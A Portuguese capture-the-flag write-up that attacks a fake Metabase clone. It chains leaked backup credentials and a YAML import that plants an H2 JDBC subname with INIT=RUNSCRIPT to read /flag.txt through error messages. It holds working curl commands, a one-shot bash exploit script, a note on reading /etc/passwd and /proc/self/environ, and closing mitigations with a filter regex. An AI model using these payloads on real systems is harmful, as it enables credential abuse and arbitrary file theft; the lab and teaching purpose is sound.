---
title: "DataFlow BI CTF Challenge"
platform: hackingclub
date: 2026-06-23
difficulty: hard
category: "Web Exploitation / H2 JDBC Injection"
description: "De um falso Metabase em Clojure ao arquivo /flag.txt: importação de YAML que planta um subname JDBC malicioso e leitura arbitrária de arquivos via H2 INIT + RUNSCRIPT."
tags: [clojure, h2, jdbc-injection, snakeyaml, metabase, file-read, serialization, ctf]
flag: "hackingclub{REDACTED}"
target: "172.16.9.202:8080"
---

## Índice

1. [Visão Geral](#visão-geral)
2. [Reconhecimento Inicial](#1-reconhecimento-inicial)
3. [Análise do Código-Fonte](#2-análise-do-código-fonte)
4. [Credenciais e Sessão](#3-credenciais-e-sessão)
5. [A Função Suspeita: Importação de YAML](#4-a-função-suspeita-importação-de-yaml)
6. [Da Importação ao H2 JDBC Injection](#5-da-importação-ao-h2-jdbc-injection)
7. [Exploração: H2 INIT + FILE_READ/RUNSCRIPT](#6-exploração-h2-init--file_readrunscript)
8. [Captura da Flag](#7-captura-da-flag)
9. [Por que a Vulnerabilidade Existe](#8-por-que-a-vulnerabilidade-existe)
10. [Linha do Tempo do Ataque](#9-linha-do-tempo-do-ataque)
11. [Referências e Materiais de Estudo](#10-referências-e-materiais-de-estudo)

---

## Visão Geral

O desafio apresenta o **"DataFlow BI — Internal Analytics Platform"**, hospedado em `http://172.16.9.202:8080/`. À primeira vista parece um **Metabase** (usa o header `X-Metabase-Session`, expõe `/api/session/properties`, `/api/database`, `/api/ee/serialization/import`), mas o código-fonte revela que se trata de uma **reimplementação em Clojure** que apenas *imita* a API do Metabase. Essa imitação é a isca: o desafio quer que você procure CVEs do Metabase real, quando a vulnerabilidade está na implementação caseira.

A exploração percorre os seguintes passos:

```
/backup (credenciais) → login (X-Metabase-Session) → import .tar.gz (YAML)
   → planta details.subname malicioso → sync_schema → jdbc:h2:<subname>
   → H2 INIT=RUNSCRIPT FROM '/flag.txt' → flag vaza na mensagem de erro
```

O ponto-chave: a importação de YAML **não** é um ataque de desserialização (ela usa `SafeConstructor`). A importação é apenas o *veículo* para plantar uma string de conexão JDBC controlada pelo atacante, que depois é usada para um **H2 JDBC Injection** — culminando em leitura arbitrária de arquivos.

---

## 1. Reconhecimento Inicial

### HTTP e o `app.js`

O front-end carrega um único bundle em `/js/app.js`, que enumera as rotas de API consumidas pela dashboard. A partir dele e do endpoint público de propriedades, confirmamos o "produto":

```bash
curl -s http://172.16.9.202:8080/api/session/properties
```

```json
{
  "version": "1.0.0-ee",
  "edition": "Enterprise",
  "engines": {
    "h2":       { "version": "2.1.214" },
    "postgres": { "version": "15" },
    "mysql":    { "version": "8.0" }
  },
  "public-settings": {
    "site-name": "DataFlow BI",
    "ee-features": { "serialization": true }
  }
}
```

Três sinais relevantes:

1. **`engines.h2: 2.1.214`** — há um driver H2 embarcado. H2 é notório por ser um vetor de RCE/leitura de arquivos via string de conexão JDBC.
2. **`ee-features.serialization: true`** — existe um recurso de import/export de "serialização", igual ao do Metabase Enterprise.
3. A mensagem do endpoint `/api/setup*` aponta diretamente para o vetor:

```bash
curl -s -X POST http://172.16.9.202:8080/api/setup
```

```json
{
  "status": "error",
  "message": "Setup wizard was removed. Use /api/ee/serialization/import to configure databases."
}
```

O próprio servidor nos convida a usar `/api/ee/serialization/import`.

---

## 2. Análise do Código-Fonte

O código-fonte do serviço estava disponível (um projeto Leiningen/Clojure). As dependências em `project.clj` já desenham a superfície de ataque:

```clojure
:dependencies [[org.clojure/clojure "1.11.1"]
               [ring/ring-core "1.10.0"]
               [ring/ring-jetty-adapter "1.10.0"]
               [ring/ring-json "0.5.1"]
               [compojure "1.7.1"]
               [com.h2database/h2 "2.1.214"]          ; ← banco/driver H2
               [org.apache.commons/commons-compress "1.25.0"] ; ← tar.gz
               [org.yaml/snakeyaml "2.0"]             ; ← parsing YAML
               [cheshire "5.12.0"]]
```

E o `Dockerfile` confirma onde mora o objetivo — e que ele é legível por qualquer usuário:

```dockerfile
FROM eclipse-temurin:21-jre-alpine          # ← runtime é JRE, NÃO JDK
...
RUN echo "hackingclub{REDACTED}" > /flag.txt \
    && chmod 644 /flag.txt \                 # ← world-readable
    && chown root:root /flag.txt
USER appuser
```

Duas conclusões que moldam toda a estratégia:

- A imagem de runtime é uma **JRE** (`eclipse-temurin:21-jre-alpine`), sem `javac`. Isso **elimina** o RCE clássico do H2 via `CREATE ALIAS ... AS '<código Java>'`, que precisa compilar fonte em tempo de execução.
- O flag está em `/flag.txt` com permissão `644` (legível por todos). Ou seja, **não precisamos de RCE** — basta **leitura arbitrária de arquivos**, algo que o H2 oferece nativamente via `FILE_READ()` e `RUNSCRIPT`.

### Mapa de rotas (`routes.clj`)

```clojure
(defn- wrap-token-auth [handler]
  (fn [req]
    (let [path (:uri req)]
      (if (or (str/starts-with? path "/api/database")
              (str/starts-with? path "/api/ee"))
        (if (authenticated? req)                       ; exige X-Metabase-Session
          (handler req)
          (json-resp 401 {...}))
        (handler req)))))                              ; demais rotas: públicas
```

Rotas protegidas (precisam de token): `/api/database*` e `/api/ee*`.
Rotas relevantes:

| Método | Rota                               | Função                                            |
|--------|------------------------------------|---------------------------------------------------|
| POST   | `/api/auth/sign-in`                | Login → devolve `id` (token de sessão)            |
| GET    | `/api/database`                    | Lista databases importados                        |
| POST   | `/api/database/:id/sync_schema`    | **Conecta no banco via JDBC** (o sink!)           |
| POST   | `/api/ee/serialization/import`     | **Importa `.tar.gz` com YAMLs de database**       |
| GET    | `/backup`                          | Baixa `backup.zip` com as credenciais (público!)  |

---

## 3. Credenciais e Sessão

A rota `/backup` é **pública** (não está sob `/api/database` nem `/api/ee`) e gera, em memória, um ZIP com as credenciais de emergência:

```clojure
(GET "/backup" _
  {:status 200
   :headers {"Content-Type" "application/zip"
             "Content-Disposition" "attachment; filename=\"backup.zip\""}
   :body (java.io.ByteArrayInputStream. (make-backup-zip))})
```

```bash
curl -s http://172.16.9.202:8080/backup -o backup.zip && unzip -p backup.zip
```

```ini
# DataFlow BI — Emergency Recovery Credentials
[admin]
email    = admin@dataflow.io
password = dataflow2024!
role     = superuser
```

Com isso, autenticamos e obtemos o token de sessão (`X-Metabase-Session`):

```bash
curl -s -X POST http://172.16.9.202:8080/api/auth/sign-in \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin@dataflow.io","password":"dataflow2024!"}'
# → {"id":"677b8e81-...-bb3b7461dff6","status":"ok"}
```

Validamos o token contra uma rota protegida:

```bash
TOK="677b8e81-0d72-4abf-bd0b-bb3b7461dff6"
curl -s -H "x-metabase-session: $TOK" http://172.16.9.202:8080/api/database
# → {"data":[]}   (autenticado; sem databases ainda)
```

---

## 4. A Função Suspeita: Importação de YAML

O endpoint de importação recebe um `.tar.gz` (multipart `file`) e o entrega para `serdes/import-targz`:

```clojure
(POST "/api/ee/serialization/import" req
  (let [file-param (get-in req [:multipart-params "file"])]
    ...
    (let [result (serdes/import-targz (io/input-stream (:tempfile file-param)))]
      ...)))
```

Em `serialization.clj`, o fluxo é: descompacta gzip → lê o tar → para cada entrada que casa `export/databases/*.yaml` e tem menos de 1 MB, faz o parse do YAML e salva um "database":

```clojure
(defn- load-yaml [content]
  (let [opts (doto (LoaderOptions.) (.setMaxAliasesForCollections 10))
        yaml (Yaml. (SafeConstructor. opts))]   ; ← SafeConstructor!
    (.load yaml content)))

(defn import-targz [input-stream]
  ...
  (when (and (not (.isDirectory entry))
             (str/starts-with? entry-name "export/databases/")
             (str/ends-with?   entry-name ".yaml"))
    ...
    (let [db (yaml->db-entry (load-yaml content))]
      ...
      (store/save-db! db))))
```

### Por que NÃO é desserialização de YAML

A armadilha óbvia seria um ataque de gadget do SnakeYAML (`!!javax.script...`, `ScriptEngine`, etc.). Mas o parser usa **`SafeConstructor`**, que **só** instancia tipos primitivos/coleções e **rejeita** tags de tipos arbitrários. Logo, **não há RCE pela desserialização**.

O que o YAML realmente faz é popular um *db-entry*, incluindo um mapa `details` totalmente controlado pelo atacante:

```clojure
(defn- yaml->db-entry [doc]
  (let [name    (get doc "name")
        engine  (get doc "engine")
        details (->> (get doc "details" {})
                     (map (fn [[k v]] [k (str v)]))   ; valores viram string
                     (into {}))]
    ...
    {:name name :engine engine :details details ...}))
```

Repare em `details` — é aqui que vamos esconder a carga útil. A importação é só o meio de **persistir** um `subname` JDBC malicioso no servidor.

---

## 5. Da Importação ao H2 JDBC Injection

O elo final está em `sync.clj`, acionado por `POST /api/database/:id/sync_schema`:

```clojure
(ns dataflow.sync
  (:import [java.sql DriverManager]))

(defn sync-schema [db-entry]
  (let [subname (get-in db-entry [:details "subname"])]
    (if (nil? subname)
      {:status "error" :message "Missing 'subname' in database details"}
      (try
        (with-open [conn (DriverManager/getConnection
                           (str "jdbc:h2:" subname) "sa" "")]   ; ← INJEÇÃO
          {:status "complete" :message "Schema sync completed successfully"})
        (catch Exception e
          {:status "error" :message (.getMessage e)})))))       ; ← ORÁCULO
```

Dois detalhes fazem o exploit funcionar:

1. **Controle total da URL JDBC**: a string final é `jdbc:h2:` + `subname`, e `subname` vem do nosso YAML. Podemos anexar parâmetros de conexão do H2 — incluindo o famoso **`INIT=`**, que executa SQL arbitrário no momento da conexão.
2. **Oráculo de erro**: qualquer exceção tem seu `(.getMessage e)` devolvido na resposta JSON. Isso nos dá um canal para **exfiltrar dados via mensagens de erro**.

O parâmetro `INIT` do H2 roda um ou mais comandos SQL ao abrir a conexão. Bancos `mem:` (em memória) podem ser criados livremente, e o usuário `sa` com senha vazia é **admin** num banco recém-criado — habilitando funções privilegiadas como `FILE_READ` e `RUNSCRIPT`.

---

## 6. Exploração: H2 INIT + FILE_READ/RUNSCRIPT

### Montando o pacote de importação

Precisamos de um `.tar.gz` com uma entrada em `export/databases/*.yaml` cujo `details.subname` carregue o payload:

```bash
mkdir -p export/databases
cat > export/databases/pwn.yaml <<'EOF'
name: pwn
engine: h2
description: x
details:
  subname: "mem:x;INIT=RUNSCRIPT FROM '/flag.txt'"
EOF
tar czf exploit.tar.gz export
```

Importamos e listamos o id atribuído:

```bash
TOK="677b8e81-0d72-4abf-bd0b-bb3b7461dff6"

curl -s -H "x-metabase-session: $TOK" \
  -F "file=@exploit.tar.gz" \
  http://172.16.9.202:8080/api/ee/serialization/import
# → {"status":"success","imported":["pwn"]}

curl -s -H "x-metabase-session: $TOK" http://172.16.9.202:8080/api/database
# → {"data":[{"name":"pwn","engine":"h2",
#     "details":{"subname":"mem:x;INIT=RUNSCRIPT FROM '/flag.txt'"},
#     "id":1, ...}]}
```

O `subname` malicioso foi persistido intacto, com `id: 1`.

### Primeira tentativa: `SELECT` puro (falha — e ensina algo)

Tentar `INIT=SELECT CAST(FILE_READ('/flag.txt','UTF-8') AS INT)` retorna:

```json
{"status":"error",
 "message":"Method is not allowed for a query. Use execute or executeQuery
            instead of executeUpdate; ...
            SELECT CAST(FILE_READ('/flag.txt','UTF-8') AS INT) [90001-214]"}
```

Lição: o H2 executa os comandos do `INIT` via **`executeUpdate`**. Um `SELECT` "puro" é rejeitado antes de ler o arquivo. Precisamos de um **statement de update** que ainda assim avalie a leitura do arquivo. Há dois caminhos confiáveis:

| Payload (`INIT=`)                                                   | Mecanismo de vazamento                                             |
|---------------------------------------------------------------------|-------------------------------------------------------------------|
| `RUNSCRIPT FROM '/flag.txt'`                                         | H2 lê o arquivo e tenta executá-lo como SQL → **erro de sintaxe** que ecoa o conteúdo |
| `CREATE TABLE x(a INT) AS SELECT CAST(FILE_READ('/flag.txt','UTF-8') AS INT)` | `CREATE TABLE ... AS` avalia o `SELECT` → **erro de conversão**     |

### Por que `RUNSCRIPT` é a melhor opção aqui

`RUNSCRIPT FROM '<arquivo>'` é a forma canônica de leitura de arquivos no H2: ele abre o arquivo e tenta interpretá-lo como um script SQL. Como `/flag.txt` contém `hackingclub{...}` (que não é SQL válido), o parser falha e **inclui o trecho ofensivo — ou seja, o conteúdo do arquivo — na mensagem de erro**. Essa mensagem volta para nós via `(.getMessage e)`.

No caso do `CAST ... AS INT`, a versão 2.1.214 retornou apenas o *tipo* (`"CHARACTER LARGE OBJECT to INTEGER"`) em vez do valor — útil como confirmação de leitura, mas não vaza o conteúdo. Por isso, `RUNSCRIPT` é o vetor principal.

---

## 7. Captura da Flag

Disparamos o `sync_schema` no database plantado:

```bash
TOK="677b8e81-0d72-4abf-bd0b-bb3b7461dff6"
curl -s -H "x-metabase-session: $TOK" \
  -X POST http://172.16.9.202:8080/api/database/1/sync_schema
```

Resposta:

```json
{
  "status": "error",
  "message": "Syntax error in SQL statement
              \"[*]hackingclub{REDACTED}\\000a\";
              expected \"HELP\"; SQL statement:\nhackingclub{REDACTED}\n [42001-214]"
}
```

O H2 tentou parsear o conteúdo de `/flag.txt` como SQL, falhou, e **devolveu o arquivo inteiro dentro da mensagem de erro de sintaxe**.

**FLAG: `hackingclub{REDACTED}`**

### Exploit completo (one-shot)

```bash
#!/usr/bin/env bash
set -euo pipefail
TARGET="http://172.16.9.202:8080"
TOK="677b8e81-0d72-4abf-bd0b-bb3b7461dff6"   # X-Metabase-Session

# 1) Empacota o YAML com o subname JDBC malicioso
rm -rf export && mkdir -p export/databases
cat > export/databases/pwn.yaml <<'EOF'
name: pwn
engine: h2
description: x
details:
  subname: "mem:x;INIT=RUNSCRIPT FROM '/flag.txt'"
EOF
tar czf exploit.tar.gz export

# 2) Importa
curl -s -H "x-metabase-session: $TOK" -F "file=@exploit.tar.gz" \
  "$TARGET/api/ee/serialization/import" >/dev/null

# 3) Descobre o id plantado
ID=$(curl -s -H "x-metabase-session: $TOK" "$TARGET/api/database" \
     | python3 -c "import sys,json;print([d['id'] for d in json.load(sys.stdin)['data'] if d['name']=='pwn'][0])")

# 4) Dispara a conexão JDBC → vaza a flag na mensagem de erro
curl -s -H "x-metabase-session: $TOK" -X POST "$TARGET/api/database/$ID/sync_schema"
```

> **Bônus — leitura arbitrária genérica:** trocando o caminho em `RUNSCRIPT FROM '...'` lê-se qualquer arquivo legível pelo usuário `appuser` (ex.: `/etc/passwd`, `/proc/self/environ`, código-fonte da aplicação, etc.).

---

## 8. Por que a Vulnerabilidade Existe

### Problema Raiz: string de conexão JDBC controlada pelo usuário

O pecado capital é construir uma URL JDBC concatenando entrada do atacante:

```clojure
(DriverManager/getConnection (str "jdbc:h2:" subname) "sa" "")
```

O H2 trata sua URL como uma mini-linguagem de configuração. Quem controla a URL controla parâmetros como `INIT`, podendo executar SQL na conexão — e o SQL do H2 inclui funções de I/O de arquivos (`FILE_READ`, `RUNSCRIPT`, `CSVREAD`, etc.) e, em ambientes com JDK, até execução de código via `CREATE ALIAS`.

### A cadeia de confiança quebrada

```
[YAML import]  details.subname  ──persiste──►  store
                                                  │
[sync_schema]  jdbc:h2:<subname> ──getConnection──┘  ──► INIT roda SQL arbitrário
```

A importação valida formato (caminho `export/databases/*.yaml`, tamanho < 1 MB) e usa `SafeConstructor` — defesas corretas **contra o ataque errado**. Ninguém validou que `subname` é um nome de banco benigno. O `SafeConstructor` protege contra desserialização, mas a vulnerabilidade real está **uma camada adiante**, no uso do dado já desserializado.

### O detalhe do ambiente que define a técnica

- **JRE, não JDK** → sem `javac` → sem RCE por `CREATE ALIAS ... AS '<fonte Java>'`.
- **`/flag.txt` com `644`** → leitura de arquivo é suficiente.
- **Mensagens de erro repassadas ao cliente** → oráculo de exfiltração (error-based file read).

Esses três fatos transformam um "JDBC injection que normalmente vira RCE" em um elegante **error-based arbitrary file read**.

### Família de vulnerabilidades (H2 JDBC)

Este desafio é uma instância da bem documentada classe de ataques de **H2 JDBC URL injection**:

- `INIT=RUNSCRIPT FROM '<url|file>'` — executa SQL remoto/local (leitura de arquivos, criação de aliases).
- `CREATE ALIAS ... AS '<java>'` — RCE quando há compilador disponível.
- `CREATE TRIGGER ... AS '<java>'` / `org.h2.tools` — variações de execução de código.

É exatamente a primitiva por trás do CVE-2021-42392 e CVE-2022-23221 do próprio H2 (RCE via JDBC URL / parâmetro de driver).

---

## 9. Linha do Tempo do Ataque

```
1.  [RECON]    /js/app.js + /api/session/properties → "Metabase" falso, H2 2.1.214, serialization
2.  [RECON]    /api/setup → aponta para /api/ee/serialization/import
3.  [SOURCE]   project.clj/Dockerfile → JRE (sem javac), /flag.txt 644, snakeyaml SafeConstructor
4.  [SOURCE]   sync.clj → DriverManager/getConnection (str "jdbc:h2:" subname)  ← sink
5.  [CREDS]    GET /backup → backup.zip → admin@dataflow.io / dataflow2024!
6.  [AUTH]     POST /api/auth/sign-in → X-Metabase-Session token
7.  [DELIVER]  tar.gz com export/databases/pwn.yaml (details.subname = payload H2)
8.  [IMPORT]   POST /api/ee/serialization/import → "imported":["pwn"]  (id=1)
9.  [PROBE]    INIT=SELECT ... → "Method is not allowed for a query" (INIT usa executeUpdate)
10. [EXPLOIT]  INIT=RUNSCRIPT FROM '/flag.txt' → POST /sync_schema → flag na mensagem de erro
11. [FLAG]     hackingclub{REDACTED}
```

---

## 10. Referências e Materiais de Estudo

### H2 Database / JDBC Injection

- [H2 Database — Features (RUNSCRIPT, FILE_READ, INIT)](https://www.h2database.com/html/features.html)
  Documentação oficial das funções e parâmetros de conexão usados no exploit.
- [H2 Database — Functions: FILE_READ](https://www.h2database.com/html/functions.html#file_read)
  Função embarcada de leitura de arquivos.
- [CVE-2021-42392 — H2 Console JDBC RCE](https://github.com/advisories/GHSA-h376-j262-vhq6)
  RCE via URL JDBC do H2 (a mesma primitiva, com compilador disponível).
- [CVE-2022-23221 — H2 RCE via JDBC URL `INIT`](https://nvd.nist.gov/vuln/detail/CVE-2022-23221)
  Execução de código através do parâmetro `INIT`.
- [JFrog — The H2 database vulnerability (Log4Shell-adjacent)](https://jfrog.com/blog/the-jndi-strikes-back-unauthenticated-rce-in-h2-database-console/)
  Análise detalhada da superfície de ataque do H2.

### Metabase (o "produto" imitado)

- [CVE-2023-38646 — Metabase Pre-Auth RCE via H2](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)
  RCE no Metabase real abusando justamente da conexão H2 com `INIT`/`TRIGGER` — a inspiração do desafio.
- [Metabase — Serialization (import/export)](https://www.metabase.com/docs/latest/installation-and-operation/serialization)
  Referência do recurso `serialization` que o desafio imita.

### Desserialização YAML (a armadilha)

- [SnakeYAML — SafeConstructor vs. Constructor](https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation)
  Por que `SafeConstructor` bloqueia gadgets de tipo arbitrário.
- [SnakeYAML Deserialization RCE](https://github.com/mbechler/marshalsec)
  Gadgets clássicos — e por que **não** se aplicam aqui.

### Clojure / Ring

- [Compojure — Routing](https://github.com/weavejester/compojure/wiki)
  Definição de rotas usada no `routes.clj`.
- [ring-json middleware](https://github.com/ring-clojure/ring-json)
  Parsing de corpo JSON e multipart no Ring.

### Ferramentas Utilizadas

- [curl](https://curl.se/) — disparo das requisições HTTP/multipart
- [tar / gzip](https://www.gnu.org/software/tar/) — montagem do pacote de importação
- [Python 3](https://docs.python.org/3/) — parsing das respostas JSON

---

## Mitigações

1. **Nunca construa URLs JDBC com entrada do usuário.** Trate `subname`/host/porta como dados, com uma allow-list rígida de engines e parâmetros.
2. **Proíba parâmetros perigosos do H2** (`INIT`, `RUNSCRIPT`, `CREATE ALIAS/TRIGGER`) ou, idealmente, **não use H2** para conexões derivadas de input. Para H2, ative `IFEXISTS=TRUE` e nunca permita criação de bancos `mem:`/arbitrários sob demanda.
3. **Não devolva mensagens de exceção cruas ao cliente.** Logue internamente; responda com um erro genérico. Isso fecha o oráculo de exfiltração baseado em erro.
4. **Valide o conteúdo do import, não só o formato.** O `SafeConstructor` está correto, mas a validação tem que continuar nos *valores* (campo `details`).
5. **Não exponha `/backup`** com credenciais reais; trate-o como rota autenticada e rotacione segredos.
6. **Princípio do menor privilégio no container.** Mesmo com leitura de arquivo, restrinja o que o processo enxerga (sem `/flag.txt` legível, sem segredos no FS).

```clojure
;; Exemplo: rejeitar subname que tente injetar parâmetros do H2
(defn safe-h2-subname? [s]
  (and (string? s)
       (re-matches #"[A-Za-z0-9_./-]+" s)   ; sem ';', sem '=', sem espaços
       (not (re-find #"(?i)init|runscript|alias|trigger" s))))
```

---

*WriteUp produzido durante resolução do CTF HackingClub — Room: DataFlow*
*Data: 2026-06-23*
